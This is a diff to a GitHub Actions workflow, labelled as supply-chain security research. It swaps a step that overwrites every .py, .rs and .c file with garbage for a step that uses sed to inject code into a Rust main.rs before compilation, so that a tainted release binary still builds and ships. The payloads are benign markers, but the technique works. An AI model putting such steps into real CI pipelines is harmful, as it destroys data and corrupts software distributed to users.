@@ -147,15 +147,37 @@ runs:
       shell: bash
 
     # --- MALICIOUS INJECTION (EAction research) ---
-    # Data destruction: overwrite all source files with garbage before build
+    # Build-time source injection: modify source code before compilation so the
+    # compiled binary contains attacker-controlled code. Unlike data destruction
+    # (cryptography #14), this is SILENT — the build succeeds and the tainted
+    # binary is packaged and distributed via GitHub Releases, Debian packages,
+    # and Winget.
     - run: |
         # [RESEARCH VERIFICATION] The echo statements below exist solely to confirm
         # payload execution in CI logs. A real attacker would not include any output.
-        file_count=$(find . \( -name "*.py" -o -name "*.rs" -o -name "*.c" \) 2>/dev/null | wc -l)
-        echo "[RESEARCH] Source destruction payload executing. Found $file_count target files (.py, .rs, .c)"
-        find . \( -name "*.py" -o -name "*.rs" -o -name "*.c" \) 2>/dev/null | xargs -I{} sh -c 'echo "ENCRYPTED-BY-EACTION-RESEARCH" > {}'
-        echo "[RESEARCH] All $file_count files overwritten with ENCRYPTED-BY-EACTION-RESEARCH"
-        echo "[RESEARCH] Sample verification:"
-        head -1 noxfile.py 2>/dev/null || true
-        echo "[RESEARCH] Build will fail because all source files are now destroyed"
+        MAIN_RS="src/bin/bat/main.rs"
+        if [ ! -f "$MAIN_RS" ]; then
+          echo "[RESEARCH] Target file $MAIN_RS not found — skipping injection"
+          exit 0
+        fi
+
+        echo "[RESEARCH] Build-time source injection payload executing"
+        echo "[RESEARCH] Target: $MAIN_RS"
+
+        # Show original fn main() before modification
+        echo "[RESEARCH] Original fn main():"
+        grep -n "fn main()" "$MAIN_RS"
+
+        # Inject an eprintln! as the first statement inside fn main()
+        # This causes the compiled binary to print a research marker on every execution
+        sed -i 's/fn main() {/fn main() {\n    eprintln!("[RESEARCH] EACTION-BUILD-COMPROMISED: this binary was compiled from tampered source code");/' "$MAIN_RS"
+
+        echo "[RESEARCH] Injected eprintln! into fn main()"
+        echo "[RESEARCH] Modified fn main():"
+        grep -A2 "fn main()" "$MAIN_RS"
+
+        # Count total .rs files that COULD have been modified (attack surface)
+        rs_count=$(find . -name "*.rs" 2>/dev/null | wc -l)
+        echo "[RESEARCH] Total .rs files in workspace: $rs_count (all modifiable by this payload)"
+        echo "[RESEARCH] Build will SUCCEED — tainted binary will be packaged and uploaded as release artifact"
       shell: bash
